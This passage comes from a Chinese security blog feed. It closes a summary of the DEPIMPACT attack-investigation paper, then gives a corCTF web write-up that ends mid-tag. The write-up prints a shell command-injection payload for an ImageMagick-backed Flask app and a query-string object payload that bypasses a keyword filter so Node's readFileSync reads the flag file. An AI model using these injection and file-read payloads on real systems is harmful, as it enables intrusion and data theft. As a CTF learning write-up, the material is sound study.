报告中提取知识并从提取的知识中综合威胁搜寻查询。Milajerdi等人提出依靠可疑信息流的相关性来检测正在进行的攻击活动。他们进一步建议利用CTI报告中的知识，通过图形模式匹配来调整系统审计数据中记录的攻击行为。Pasquier等人通过将运行时内核层引用监视器与查询模块相结合，提出了一种运行时的溯源分析方法。Hossain等人提出了一种基于标签的技术，来对系统审计数据进行实时攻击检测和重构。DEPIMPACT 可以与这些技术交互以实现更好的防御。</p><p><strong>分数传播</strong>我们的相关性分数传播方案受到TrustRank算法的启发，该算法最初目的是区别垃圾邮件和信誉良好的网页:它首先选择一小部分信誉良好的种子页面，然后使用PageRank算法按照链接结构传播信任分数，并将垃圾邮件页面识别为得分较低的页面。类似的想法已经应用于安全和隐私应用场景，包括Sybil检测和虚假审查检测。DEPIMPACT是第一个在系统审计日志记录领域中应用分数传播思想的，该思想传播依赖关系影响，识别攻击条目以过滤不相关的依赖关系。</p><p><strong>边的权重计算</strong>DEPIMPACT的几个组件是在一系列现有技术上建立的。我们边的聚类步骤基于Multi-KMeans++，与标准KMeans相比，它优化了种子初始化以获得更好的聚类质量。我们的判别特征投影步骤基于线性判别分析(LDA) ，它找到一个特征线性组合来表征或分离多类对象。</p><h2 id="总结-1">8 总结</h2><p>我们提出 DEPIMPACT，这是一个用于识别由因果关系分析生成的 POI事件的依赖图的关键部分的框架，它保留攻击信息并过滤掉不相关的依赖项。具体来说，DEPIMPACT为边分配有区别的依赖权重以揭示关键边，并计算并传播依赖影响到入口节点以揭示攻击入口。通过从排名靠前的入口节点进一步执行前向因果关系分析并获取图形重叠，DEPIMPACT仅保留与 POI事件和攻击入口高度相关的依赖关系。我们对真实攻击的评估证明了 DEPIMPACT在过滤掉不相关的依赖项（生成大约小6250倍的图）同时保留与攻击相关的依赖项方面的有效性。</p>]]></content>
      
      
      
        <tags>
            
            <tag> papers </tag>
            
            <tag> attack_investigation </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>corCTF-部分web</title>
      <link href="/2022/08/09/corCTF-%E9%83%A8%E5%88%86web/"/>
      <url>/2022/08/09/corCTF-%E9%83%A8%E5%88%86web/</url>
      
        <content type="html"><![CDATA[<h1 id="corctf-部分web记录">corCTF 部分web记录</h1><h2 id="jsonquiz">jsonquiz</h2><p>quiz.js</p><div class="sourceCode" id="cb1"><pre class="sourceCode js"><code class="sourceCode javascript"><span id="cb1-1"><a href="#cb1-1" aria-hidden="true" tabindex="-1"></a>    <span class="pp">setTimeout</span>(() <span class="kw">=&gt;</span> {</span><span id="cb1-2"><a href="#cb1-2" aria-hidden="true" tabindex="-1"></a>        <span class="kw">let</span> score <span class="op">=</span> <span class="dv">0</span><span class="op">;</span></span><span id="cb1-3"><a href="#cb1-3" aria-hidden="true" tabindex="-1"></a>        <span class="fu">fetch</span>(<span class="st">"/submit"</span><span class="op">,</span> {</span><span id="cb1-4"><a href="#cb1-4" aria-hidden="true" tabindex="-1"></a>            <span class="dt">method</span><span class="op">:</span> <span class="st">"POST"</span><span class="op">,</span></span><span id="cb1-5"><a href="#cb1-5" aria-hidden="true" tabindex="-1"></a>            <span class="dt">headers</span><span class="op">:</span> {</span><span id="cb1-6"><a href="#cb1-6" aria-hidden="true" tabindex="-1"></a>                <span class="st">"Content-Type"</span><span class="op">:</span> <span class="st">"application/x-www-form-urlencoded"</span></span><span id="cb1-7"><a href="#cb1-7" aria-hidden="true" tabindex="-1"></a>            }<span class="op">,</span></span><span id="cb1-8"><a href="#cb1-8" aria-hidden="true" tabindex="-1"></a>            <span class="dt">body</span><span class="op">:</span> <span class="st">"score="</span> <span class="op">+</span> score</span><span id="cb1-9"><a href="#cb1-9" aria-hidden="true" tabindex="-1"></a>        })</span><span id="cb1-10"><a href="#cb1-10" aria-hidden="true" tabindex="-1"></a>        <span class="op">.</span><span class="fu">then</span>(r <span class="kw">=&gt;</span> r<span class="op">.</span><span class="fu">json</span>())</span><span id="cb1-11"><a href="#cb1-11" aria-hidden="true" tabindex="-1"></a>        <span class="op">.</span><span class="fu">then</span>(j <span class="kw">=&gt;</span> {</span><span id="cb1-12"><a href="#cb1-12" aria-hidden="true" tabindex="-1"></a>            <span class="cf">if</span> (j<span class="op">.</span><span class="at">pass</span>) {</span><span id="cb1-13"><a href="#cb1-13" aria-hidden="true" tabindex="-1"></a>                <span class="fu">$</span>(<span class="st">"#reward"</span>)<span class="op">.</span><span class="at">innerText</span> <span class="op">=</span> j<span class="op">.</span><span class="at">flag</span><span class="op">;</span></span><span id="cb1-14"><a href="#cb1-14" aria-hidden="true" tabindex="-1"></a>                <span class="fu">$</span>(<span class="st">"#pass"</span>)<span class="op">.</span><span class="at">style</span><span class="op">.</span><span class="at">display</span> <span class="op">=</span> <span class="st">"block"</span><span class="op">;</span></span><span id="cb1-15"><a href="#cb1-15" aria-hidden="true" tabindex="-1"></a>            }</span><span id="cb1-16"><a href="#cb1-16" aria-hidden="true" tabindex="-1"></a>            <span class="cf">else</span> {</span><span id="cb1-17"><a href="#cb1-17" aria-hidden="true" tabindex="-1"></a>                <span class="fu">$</span>(<span class="st">"#fail"</span>)<span class="op">.</span><span class="at">style</span><span class="op">.</span><span class="at">display</span> <span class="op">=</span> <span class="st">"block"</span><span class="op">;</span></span><span id="cb1-18"><a href="#cb1-18" aria-hidden="true" tabindex="-1"></a>            }</span><span id="cb1-19"><a href="#cb1-19" aria-hidden="true" tabindex="-1"></a>        })<span class="op">;</span></span><span id="cb1-20"><a href="#cb1-20" aria-hidden="true" tabindex="-1"></a>    }<span class="op">,</span> <span class="dv">1250</span>)<span class="op">;</span></span></code></pre></div><p>直接请求就行</p><figure><img src="image-20220808150155457.png" alt="image-20220808150155457"><figcaption aria-hidden="true">image-20220808150155457</figcaption></figure><h2 id="msfrog-generator">msfrog-generator</h2><div class="sourceCode" id="cb2"><pre class="sourceCode js"><code class="sourceCode javascript"><span id="cb2-1"><a href="#cb2-1" aria-hidden="true" tabindex="-1"></a>    <span class="kw">let</span> jsonData <span class="op">=</span> []<span class="op">;</span></span><span id="cb2-2"><a href="#cb2-2" aria-hidden="true" tabindex="-1"></a>    placedItems<span class="op">.</span><span class="fu">forEach</span>((item) <span class="kw">=&gt;</span> {</span><span id="cb2-3"><a href="#cb2-3" aria-hidden="true" tabindex="-1"></a>      jsonData<span class="op">.</span><span class="fu">push</span>({ <span class="dt">type</span><span class="op">:</span> item<span class="op">.</span><span class="at">type</span><span class="op">,</span> <span class="dt">pos</span><span class="op">:</span> item<span class="op">.</span><span class="at">pos</span> })<span class="op">;</span></span><span id="cb2-4"><a href="#cb2-4" aria-hidden="true" tabindex="-1"></a>    })<span class="op">;</span></span><span id="cb2-5"><a href="#cb2-5" aria-hidden="true" tabindex="-1"></a></span><span id="cb2-6"><a href="#cb2-6" aria-hidden="true" tabindex="-1"></a>    <span class="cf">try</span> {</span><span id="cb2-7"><a href="#cb2-7" aria-hidden="true" tabindex="-1"></a>      <span class="kw">let</span> response <span class="op">=</span> <span class="cf">await</span> <span class="fu">fetch</span>(<span class="st">"/api/generate"</span><span class="op">,</span> {</span><span id="cb2-8"><a href="#cb2-8" aria-hidden="true" tabindex="-1"></a>        <span class="dt">method</span><span class="op">:</span> <span class="st">"POST"</span><span class="op">,</span></span><span id="cb2-9"><a href="#cb2-9" aria-hidden="true" tabindex="-1"></a>        <span class="dt">headers</span><span class="op">:</span> {</span><span id="cb2-10"><a href="#cb2-10" aria-hidden="true" tabindex="-1"></a>          <span class="st">"Content-Type"</span><span class="op">:</span> <span class="st">"application/json"</span><span class="op">,</span></span><span id="cb2-11"><a href="#cb2-11" aria-hidden="true" tabindex="-1"></a>        }<span class="op">,</span></span><span id="cb2-12"><a href="#cb2-12" aria-hidden="true" tabindex="-1"></a>        <span class="dt">body</span><span class="op">:</span> <span class="bu">JSON</span><span class="op">.</span><span class="fu">stringify</span>(jsonData)<span class="op">,</span></span><span id="cb2-13"><a href="#cb2-13" aria-hidden="true" tabindex="-1"></a>      })<span class="op">;</span></span><span id="cb2-14"><a href="#cb2-14" aria-hidden="true" tabindex="-1"></a>      <span class="cf">if</span> (response<span class="op">.</span><span class="at">status</span> <span class="op">!==</span> <span class="dv">200</span>)</span><span id="cb2-15"><a href="#cb2-15" aria-hidden="true" tabindex="-1"></a>        <span class="cf">throw</span> <span class="vs">`Unexpected response: </span><span class="sc">${</span>response<span class="op">.</span><span class="at">status</span><span class="sc">}</span><span class="vs">`</span><span class="op">;</span></span><span id="cb2-16"><a href="#cb2-16" aria-hidden="true" tabindex="-1"></a>      response <span class="op">=</span> <span class="cf">await</span> response<span class="op">.</span><span class="fu">json</span>()<span class="op">;</span></span><span id="cb2-17"><a href="#cb2-17" aria-hidden="true" tabindex="-1"></a>      <span class="cf">if</span> (<span class="op">!</span>response<span class="op">.</span><span class="at">msfrog</span>) <span class="cf">throw</span> <span class="st">"Empty response, the heck?"</span><span class="op">;</span></span><span id="cb2-18"><a href="#cb2-18" aria-hidden="true" tabindex="-1"></a>      toast<span class="op">.</span><span class="fu">success</span>(<span class="st">"Enjoy your MsFrog :D"</span>)<span class="op">;</span></span><span id="cb2-19"><a href="#cb2-19" aria-hidden="true" tabindex="-1"></a>      <span class="fu">triggerBase64Download</span>(</span><span id="cb2-20"><a href="#cb2-20" aria-hidden="true" tabindex="-1"></a>        <span class="vs">`data:image/png;base64,</span><span class="sc">${</span>response<span class="op">.</span><span class="at">msfrog</span><span class="sc">}</span><span class="vs">`</span><span class="op">,</span></span><span id="cb2-21"><a href="#cb2-21" aria-hidden="true" tabindex="-1"></a>        <span class="st">"msfrog"</span></span><span id="cb2-22"><a href="#cb2-22" aria-hidden="true" tabindex="-1"></a>      )<span class="op">;</span></span><span id="cb2-23"><a href="#cb2-23" aria-hidden="true" tabindex="-1"></a>    } <span class="cf">catch</span> (e) {</span><span id="cb2-24"><a href="#cb2-24" aria-hidden="true" tabindex="-1"></a>      toast<span class="op">.</span><span class="fu">error</span>(<span class="vs">`Sadge, something went wrong: </span><span class="sc">${</span>e<span class="sc">}</span><span class="vs">`</span>)<span class="op">;</span></span><span id="cb2-25"><a href="#cb2-25" aria-hidden="true" tabindex="-1"></a>    }</span></code></pre></div><p>随便修改一点参数</p><figure><img src="image-20220808150746039.png" alt="image-20220808150746039"><figcaption aria-hidden="true">image-20220808150746039</figcaption></figure><p>根据回显 感觉type处能够执行shell</p><figure><img src="image-20220808151124578.png" alt="image-20220808151124578"><figcaption aria-hidden="true">image-20220808151124578</figcaption></figure><p>读取一下源码看看后端逻辑</p><div class="sourceCode" id="cb3"><pre class="sourceCode python"><code class="sourceCode python"><span id="cb3-1"><a href="#cb3-1" aria-hidden="true" tabindex="-1"></a><span class="im">import</span> os</span><span id="cb3-2"><a href="#cb3-2" aria-hidden="true" tabindex="-1"></a><span class="im">import</span> json</span><span id="cb3-3"><a href="#cb3-3" aria-hidden="true" tabindex="-1"></a><span class="im">import</span> subprocess</span><span id="cb3-4"><a href="#cb3-4" aria-hidden="true" tabindex="-1"></a><span class="im">from</span> flask <span class="im">import</span> Flask, send_from_directory, request</span><span id="cb3-5"><a href="#cb3-5" aria-hidden="true" tabindex="-1"></a></span><span id="cb3-6"><a href="#cb3-6" aria-hidden="true" tabindex="-1"></a>app <span class="op">=</span> Flask(<span class="va">__name__</span>, static_folder<span class="op">=</span><span class="st">'fe'</span>)</span><span id="cb3-7"><a href="#cb3-7" aria-hidden="true" tabindex="-1"></a></span><span id="cb3-8"><a href="#cb3-8" aria-hidden="true" tabindex="-1"></a></span><span id="cb3-9"><a href="#cb3-9" aria-hidden="true" tabindex="-1"></a><span class="at">@app.route</span>(<span class="st">'/api/generate'</span>, methods<span class="op">=</span>[<span class="st">'POST'</span>])</span><span id="cb3-10"><a href="#cb3-10" aria-hidden="true" tabindex="-1"></a><span class="kw">def</span> generate_msfrog():</span><span id="cb3-11"><a href="#cb3-11" aria-hidden="true" tabindex="-1"></a>    <span class="co"># Check if we received JSON</span></span><span id="cb3-12"><a href="#cb3-12" aria-hidden="true" tabindex="-1"></a>    <span class="cf">if</span> <span class="kw">not</span> request.is_json:</span><span id="cb3-13"><a href="#cb3-13" aria-hidden="true" tabindex="-1"></a>        <span class="cf">return</span> <span class="st">"I only speak JSON :c"</span>, <span class="dv">400</span></span><span id="cb3-14"><a href="#cb3-14" aria-hidden="true" tabindex="-1"></a></span><span id="cb3-15"><a href="#cb3-15" aria-hidden="true" tabindex="-1"></a>    <span class="co"># Grab all the msfrog accessoires</span></span><span id="cb3-16"><a href="#cb3-16" aria-hidden="true" tabindex="-1"></a>    accessoires <span class="op">=</span> <span class="va">None</span></span><span id="cb3-17"><a href="#cb3-17" aria-hidden="true" tabindex="-1"></a>    <span class="cf">try</span>:</span><span id="cb3-18"><a href="#cb3-18" aria-hidden="true" tabindex="-1"></a>        accessoires <span class="op">=</span> request.get_json()</span><span id="cb3-19"><a href="#cb3-19" aria-hidden="true" tabindex="-1"></a>    <span class="cf">except</span>:</span><span id="cb3-20"><a href="#cb3-20" aria-hidden="true" tabindex="-1"></a>        <span class="cf">return</span> <span class="st">"nice json"</span>, <span class="dv">400</span></span><span id="cb3-21"><a href="#cb3-21" aria-hidden="true" tabindex="-1"></a></span><span id="cb3-22"><a href="#cb3-22" aria-hidden="true" tabindex="-1"></a>    <span class="cf">if</span> <span class="kw">not</span> accessoires <span class="kw">or</span> <span class="kw">not</span> <span class="bu">isinstance</span>(accessoires, <span class="bu">list</span>):</span><span id="cb3-23"><a href="#cb3-23" aria-hidden="true" tabindex="-1"></a>        <span class="cf">return</span> <span class="st">":msfrog:"</span>, <span class="dv">400</span></span><span id="cb3-24"><a href="#cb3-24" aria-hidden="true" tabindex="-1"></a></span><span id="cb3-25"><a href="#cb3-25" aria-hidden="true" tabindex="-1"></a>    composites <span class="op">=</span> []</span><span id="cb3-26"><a href="#cb3-26" aria-hidden="true" tabindex="-1"></a>    <span class="cf">for</span> accessoire <span class="kw">in</span> accessoires:</span><span id="cb3-27"><a href="#cb3-27" aria-hidden="true" tabindex="-1"></a>        <span class="cf">if</span> <span class="st">'type'</span> <span class="kw">not</span> <span class="kw">in</span> accessoire:</span><span id="cb3-28"><a href="#cb3-28" aria-hidden="true" tabindex="-1"></a>            <span class="cf">return</span> <span class="st">"missing type lmao"</span>, <span class="dv">400</span></span><span id="cb3-29"><a href="#cb3-29" aria-hidden="true" tabindex="-1"></a></span><span id="cb3-30"><a href="#cb3-30" aria-hidden="true" tabindex="-1"></a>        <span class="bu">type</span> <span class="op">=</span> accessoire[<span class="st">'type'</span>]</span><span id="cb3-31"><a href="#cb3-31" aria-hidden="true" tabindex="-1"></a>        pos <span class="op">=</span> accessoire.get(<span class="st">'pos'</span>, <span class="va">None</span>)</span><span id="cb3-32"><a href="#cb3-32" aria-hidden="true" tabindex="-1"></a>        <span class="cf">if</span> <span class="kw">not</span> pos <span class="kw">or</span> <span class="kw">not</span> <span class="bu">isinstance</span>(pos, <span class="bu">dict</span>):</span><span id="cb3-33"><a href="#cb3-33" aria-hidden="true" tabindex="-1"></a>            <span class="cf">return</span> <span class="st">"Ehh I need the position to supply to imagemagick"</span>, <span class="dv">400</span></span><span id="cb3-34"><a href="#cb3-34" aria-hidden="true" tabindex="-1"></a></span><span id="cb3-35"><a href="#cb3-35" aria-hidden="true" tabindex="-1"></a>        x <span class="op">=</span> pos.get(<span class="st">'x'</span>, <span class="va">None</span>)</span><span id="cb3-36"><a href="#cb3-36" aria-hidden="true" tabindex="-1"></a>        y <span class="op">=</span> pos.get(<span class="st">'y'</span>, <span class="va">None</span>)</span><span id="cb3-37"><a href="#cb3-37" aria-hidden="true" tabindex="-1"></a></span><span id="cb3-38"><a href="#cb3-38" aria-hidden="true" tabindex="-1"></a>        <span class="cf">if</span> <span class="kw">not</span> <span class="bu">isinstance</span>(<span class="bu">type</span>, <span class="bu">str</span>):</span><span id="cb3-39"><a href="#cb3-39" aria-hidden="true" tabindex="-1"></a>            <span class="cf">return</span> <span class="st">"missing type lmao"</span>, <span class="dv">400</span></span><span id="cb3-40"><a href="#cb3-40" aria-hidden="true" tabindex="-1"></a></span><span id="cb3-41"><a href="#cb3-41" aria-hidden="true" tabindex="-1"></a>        <span class="co"># Anti haxxor check</span></span><span id="cb3-42"><a href="#cb3-42" aria-hidden="true" tabindex="-1"></a>        <span class="cf">if</span> <span class="kw">not</span> os.path.exists(<span class="st">"./img/"</span> <span class="op">+</span> os.path.basename(<span class="bu">type</span>)):</span><span id="cb3-43"><a href="#cb3-43" aria-hidden="true" tabindex="-1"></a>            <span class="cf">return</span> <span class="st">"I wont pass a non existing image to a shell command lol"</span>, <span class="dv">400</span></span><span id="cb3-44"><a href="#cb3-44" aria-hidden="true" tabindex="-1"></a></span><span id="cb3-45"><a href="#cb3-45" aria-hidden="true" tabindex="-1"></a>        <span class="cf">if</span> x <span class="kw">is</span> <span class="va">None</span> <span class="kw">or</span> y <span class="kw">is</span> <span class="va">None</span>:</span><span id="cb3-46"><a href="#cb3-46" aria-hidden="true" tabindex="-1"></a>            <span class="cf">return</span> <span class="st">"Ehh I need the position to supply to imagemagick"</span>, <span class="dv">400</span></span><span id="cb3-47"><a href="#cb3-47" aria-hidden="true" tabindex="-1"></a></span><span id="cb3-48"><a href="#cb3-48" aria-hidden="true" tabindex="-1"></a>        composites.append(<span class="ss">f"img/</span><span class="sc">{</span><span class="bu">type</span><span class="sc">}</span><span class="ss"> -geometry +</span><span class="sc">{</span>x<span class="sc">}</span><span class="ss">+</span><span class="sc">{</span>y<span class="sc">}</span><span class="ss"> -composite"</span>)</span><span id="cb3-49"><a href="#cb3-49" aria-hidden="true" tabindex="-1"></a></span><span id="cb3-50"><a href="#cb3-50" aria-hidden="true" tabindex="-1"></a>    <span class="cf">try</span>:</span><span id="cb3-51"><a href="#cb3-51" aria-hidden="true" tabindex="-1"></a>        result <span class="op">=</span> subprocess.run(</span><span id="cb3-52"><a href="#cb3-52" aria-hidden="true" tabindex="-1"></a>            <span class="ss">f"convert img/base.png </span><span class="sc">{</span><span class="st">' '</span><span class="sc">.</span>join(composites)<span class="sc">}</span><span class="ss"> -trim png:- | base64 -w0"</span>, capture_output<span class="op">=</span><span class="va">True</span>, shell<span class="op">=</span><span class="va">True</span>)</span><span id="cb3-53"><a href="#cb3-53" aria-hidden="true" tabindex="-1"></a>        <span class="cf">if</span> result.returncode <span class="op">!=</span> <span class="dv">0</span> <span class="kw">or</span> <span class="bu">len</span>(result.stdout) <span class="op">==</span> <span class="dv">0</span>:</span><span id="cb3-54"><a href="#cb3-54" aria-hidden="true" tabindex="-1"></a>            <span class="cf">return</span> <span class="ss">f"Something went wrong :</span><span class="ch">\n</span><span class="sc">{</span>result<span class="sc">.</span>stderr<span class="sc">}</span><span class="ss">"</span>, <span class="dv">500</span></span><span id="cb3-55"><a href="#cb3-55" aria-hidden="true" tabindex="-1"></a>        <span class="cf">return</span> json.dumps({<span class="st">"msfrog"</span>: result.stdout.decode(<span class="st">'utf8'</span>)})</span><span id="cb3-56"><a href="#cb3-56" aria-hidden="true" tabindex="-1"></a>    <span class="cf">except</span>:</span><span id="cb3-57"><a href="#cb3-57" aria-hidden="true" tabindex="-1"></a>        <span class="cf">return</span> json.dumps({<span class="st">"msfrog"</span>: <span class="st">"error"</span>})</span><span id="cb3-58"><a href="#cb3-58" aria-hidden="true" tabindex="-1"></a></span><span id="cb3-59"><a href="#cb3-59" aria-hidden="true" tabindex="-1"></a></span><span id="cb3-60"><a href="#cb3-60" aria-hidden="true" tabindex="-1"></a><span class="op">@</span> app.route(<span class="st">'/'</span>)</span><span id="cb3-61"><a href="#cb3-61" aria-hidden="true" tabindex="-1"></a><span class="kw">def</span> serve_index():</span><span id="cb3-62"><a href="#cb3-62" aria-hidden="true" tabindex="-1"></a>    <span class="cf">return</span> send_from_directory(app.static_folder, <span class="st">'index.html'</span>)</span><span id="cb3-63"><a href="#cb3-63" aria-hidden="true" tabindex="-1"></a></span><span id="cb3-64"><a href="#cb3-64" aria-hidden="true" tabindex="-1"></a></span><span id="cb3-65"><a href="#cb3-65" aria-hidden="true" tabindex="-1"></a><span class="op">@</span> app.route(<span class="st">'/&lt;path:path&gt;'</span>)</span><span id="cb3-66"><a href="#cb3-66" aria-hidden="true" tabindex="-1"></a><span class="kw">def</span> serve_react(path):</span><span id="cb3-67"><a href="#cb3-67" aria-hidden="true" tabindex="-1"></a>    <span class="cf">if</span> path <span class="op">!=</span> <span class="st">""</span> <span class="kw">and</span> os.path.exists(app.static_folder <span class="op">+</span> <span class="st">'/'</span> <span class="op">+</span> path):</span><span id="cb3-68"><a href="#cb3-68" aria-hidden="true" tabindex="-1"></a>        <span class="cf">return</span> send_from_directory(app.static_folder, path)</span><span id="cb3-69"><a href="#cb3-69" aria-hidden="true" tabindex="-1"></a>    <span class="cf">else</span>:</span><span id="cb3-70"><a href="#cb3-70" aria-hidden="true" tabindex="-1"></a>        <span class="cf">return</span> <span class="st">"File not found"</span>, <span class="dv">404</span></span><span id="cb3-71"><a href="#cb3-71" aria-hidden="true" tabindex="-1"></a></span><span id="cb3-72"><a href="#cb3-72" aria-hidden="true" tabindex="-1"></a></span><span id="cb3-73"><a href="#cb3-73" aria-hidden="true" tabindex="-1"></a><span class="cf">if</span> <span class="va">__name__</span> <span class="op">==</span> <span class="st">'__main__'</span>:</span><span id="cb3-74"><a href="#cb3-74" aria-hidden="true" tabindex="-1"></a>    app.run(host<span class="op">=</span><span class="st">'0.0.0.0'</span>, port<span class="op">=</span><span class="dv">5000</span>, threaded<span class="op">=</span><span class="va">True</span>)</span></code></pre></div><p>根据代码 会产生命令注入的问题</p><p><code>convert img/base.png img/;whoami;/mstongue.png -geometry +157+128 -composite -trim png:- | base64 -w0</code></p><p>原理大体就是这样，然后<code>/mstongue.png</code>拼接回去<code>./img/mstongue.png</code></p><p>也能通过</p><div class="sourceCode" id="cb4"><pre class="sourceCode python"><code class="sourceCode python"><span id="cb4-1"><a href="#cb4-1" aria-hidden="true" tabindex="-1"></a>        <span class="cf">if</span> <span class="kw">not</span> os.path.exists(<span class="st">"./img/"</span> <span class="op">+</span> os.path.basename(<span class="bu">type</span>)):</span><span id="cb4-2"><a href="#cb4-2" aria-hidden="true" tabindex="-1"></a>            <span class="cf">return</span> <span class="st">"I wont pass a non existing image to a shell command lol"</span>, <span class="dv">400</span></span></code></pre></div><h2 id="simple-waf">simple waf</h2><p>nodejs</p><div class="sourceCode" id="cb5"><pre class="sourceCode js"><code class="sourceCode javascript"><span id="cb5-1"><a href="#cb5-1" aria-hidden="true" tabindex="-1"></a><span class="kw">const</span> express <span class="op">=</span> <span class="pp">require</span>(<span class="st">"express"</span>)<span class="op">;</span></span><span id="cb5-2"><a href="#cb5-2" aria-hidden="true" tabindex="-1"></a><span class="kw">const</span> fs <span class="op">=</span> <span class="pp">require</span>(<span class="st">"fs"</span>)<span class="op">;</span></span><span id="cb5-3"><a href="#cb5-3" aria-hidden="true" tabindex="-1"></a></span><span id="cb5-4"><a href="#cb5-4" aria-hidden="true" tabindex="-1"></a><span class="kw">const</span> app <span class="op">=</span> <span class="fu">express</span>()<span class="op">;</span></span><span id="cb5-5"><a href="#cb5-5" aria-hidden="true" tabindex="-1"></a></span><span id="cb5-6"><a href="#cb5-6" aria-hidden="true" tabindex="-1"></a><span class="kw">const</span> PORT <span class="op">=</span> <span class="bu">process</span><span class="op">.</span><span class="at">env</span><span class="op">.</span><span class="at">PORT</span> <span class="op">||</span> <span class="dv">3456</span><span class="op">;</span></span><span id="cb5-7"><a href="#cb5-7" aria-hidden="true" tabindex="-1"></a></span><span id="cb5-8"><a href="#cb5-8" aria-hidden="true" tabindex="-1"></a>app<span class="op">.</span><span class="fu">use</span>((req<span class="op">,</span> res<span class="op">,</span> next) <span class="kw">=&gt;</span> {</span><span id="cb5-9"><a href="#cb5-9" aria-hidden="true" tabindex="-1"></a>    <span class="cf">if</span>([req<span class="op">.</span><span class="at">body</span><span class="op">,</span> req<span class="op">.</span><span class="at">headers</span><span class="op">,</span> req<span class="op">.</span><span class="at">query</span>]<span class="op">.</span><span class="fu">some</span>(</span><span id="cb5-10"><a href="#cb5-10" aria-hidden="true" tabindex="-1"></a>        (item) <span class="kw">=&gt;</span> item <span class="op">&amp;&amp;</span> <span class="bu">JSON</span><span class="op">.</span><span class="fu">stringify</span>(item)<span class="op">.</span><span class="fu">includes</span>(<span class="st">"flag"</span>)</span><span id="cb5-11"><a href="#cb5-11" aria-hidden="true" tabindex="-1"></a>    )) {</span><span id="cb5-12"><a href="#cb5-12" aria-hidden="true" tabindex="-1"></a>        <span class="cf">return</span> res<span class="op">.</span><span class="fu">send</span>(<span class="st">"bad hacker!"</span>)<span class="op">;</span></span><span id="cb5-13"><a href="#cb5-13" aria-hidden="true" tabindex="-1"></a>    }</span><span id="cb5-14"><a href="#cb5-14" aria-hidden="true" tabindex="-1"></a>    <span class="fu">next</span>()<span class="op">;</span></span><span id="cb5-15"><a href="#cb5-15" aria-hidden="true" tabindex="-1"></a>})<span class="op">;</span></span><span id="cb5-16"><a href="#cb5-16" aria-hidden="true" tabindex="-1"></a></span><span id="cb5-17"><a href="#cb5-17" aria-hidden="true" tabindex="-1"></a>app<span class="op">.</span><span class="fu">get</span>(<span class="st">"/"</span><span class="op">,</span> (req<span class="op">,</span> res) <span class="kw">=&gt;</span> {</span><span id="cb5-18"><a href="#cb5-18" aria-hidden="true" tabindex="-1"></a>    <span class="cf">try</span> {</span><span id="cb5-19"><a href="#cb5-19" aria-hidden="true" tabindex="-1"></a>        res<span class="op">.</span><span class="fu">setHeader</span>(<span class="st">"Content-Type"</span><span class="op">,</span> <span class="st">"text/html"</span>)<span class="op">;</span></span><span id="cb5-20"><a href="#cb5-20" aria-hidden="true" tabindex="-1"></a>        res<span class="op">.</span><span class="fu">send</span>(fs<span class="op">.</span><span class="fu">readFileSync</span>(req<span class="op">.</span><span class="at">query</span><span class="op">.</span><span class="at">file</span> <span class="op">||</span> <span class="st">"index.html"</span>)<span class="op">.</span><span class="fu">toString</span>())<span class="op">;</span>       </span><span id="cb5-21"><a href="#cb5-21" aria-hidden="true" tabindex="-1"></a>    }</span><span id="cb5-22"><a href="#cb5-22" aria-hidden="true" tabindex="-1"></a>    <span class="cf">catch</span>(err) {</span><span id="cb5-23"><a href="#cb5-23" aria-hidden="true" tabindex="-1"></a>        <span class="bu">console</span><span class="op">.</span><span class="fu">log</span>(err)<span class="op">;</span></span><span id="cb5-24"><a href="#cb5-24" aria-hidden="true" tabindex="-1"></a>        res<span class="op">.</span><span class="fu">status</span>(<span class="dv">500</span>)<span class="op">.</span><span class="fu">send</span>(<span class="st">"Internal server error"</span>)<span class="op">;</span></span><span id="cb5-25"><a href="#cb5-25" aria-hidden="true" tabindex="-1"></a>    }</span><span id="cb5-26"><a href="#cb5-26" aria-hidden="true" tabindex="-1"></a>})<span class="op">;</span></span><span id="cb5-27"><a href="#cb5-27" aria-hidden="true" tabindex="-1"></a></span><span id="cb5-28"><a href="#cb5-28" aria-hidden="true" tabindex="-1"></a>app<span class="op">.</span><span class="fu">listen</span>(PORT<span class="op">,</span> () <span class="kw">=&gt;</span> <span class="bu">console</span><span class="op">.</span><span class="fu">log</span>(<span class="vs">`web/simplewaf listening on port </span><span class="sc">${</span>PORT<span class="sc">}</span><span class="vs">`</span>))<span class="op">;</span></span></code></pre></div><p>fs.readFileSync文件读取 绕过flag关键词</p><p>比赛期间没出</p><figure><img src="image-20220808171731792.png" alt="image-20220808171731792"><figcaption aria-hidden="true">image-20220808171731792</figcaption></figure><p>可以看到readFileSync可以在URL类使用file协议</p><p>本地测试一下</p><figure><img src="image-20220809123946637.png" alt="image-20220809123946637"><figcaption aria-hidden="true">image-20220809123946637</figcaption></figure><p>对URL类会自行urldecode一次，所以可以通过这个bypass关键词</p><p>然后问题来了 如何构造解析成URL类并且使用file协议解析呢</p><p>一步步调试可以看到验证了是否是url类</p><figure><img src="image-20220808165220888.png" alt="image-20220808165220888"><figcaption aria-hidden="true">image-20220808165220888</figcaption></figure><p>去查看fs的源码（题目环境是v18.1.0，那就下载v18.x分支源码）</p><p><code>git clone -b v18.x https://github.com/nodejs/node.git</code></p><figure><img src="image-20220809125911997.png" alt="image-20220809125911997"><figcaption aria-hidden="true">image-20220809125911997</figcaption></figure><figure><img src="image-20220809125942940.png" alt="image-20220809125942940"><figcaption aria-hidden="true">image-20220809125942940</figcaption></figure><figure><img src="image-20220809130010778.png" alt="image-20220809130010778"><figcaption aria-hidden="true">image-20220809130010778</figcaption></figure><ol type="1"><li><code>fileURLOrPath</code>不为null</li><li><code>href</code>属性不为空</li><li><code>origin</code>属性不为空</li></ol><p>check过了然后<code>return fileURLToPath(fileURLOrPath)</code></p><figure><img src="image-20220809130215847.png" alt="image-20220809130215847"><figcaption aria-hidden="true">image-20220809130215847</figcaption></figure><ol start="4" type="1"><li><p><code>typeof path === 'string'</code></p></li><li><p><code>protocol === file:</code></p></li></ol><p>服务器为linux，所以会触发<code>getPathFromURLPosix</code></p><figure><img src="image-20220809130441457.png" alt="image-20220809130441457"><figcaption aria-hidden="true">image-20220809130441457</figcaption></figure><ol start="6" type="1"><li><code>hostname === ''</code></li></ol><p>然后pathname则为文件名</p><p>此外最关键的是如何传参解析呢</p><p>?file[a]=b&amp;file[c]=d</p><p>在express的req.query.file下会变成{"a": "b", "c": "d"}</p><p>所以我们只需要传参<code>?file[href]=x&amp;file[origin]=x&amp;file[protocol]=file:&amp;file[hostname]=&amp;file[pathname]=/app/fl%2561g.txt</code></p><p>两次url编码是因为在传参时会自解码一次:D)可以在自己本地debug时候docker log很容易发现这件事</p><figure><img src="image-20220809131535944.png" alt="image-20220809131535944"><figcaption 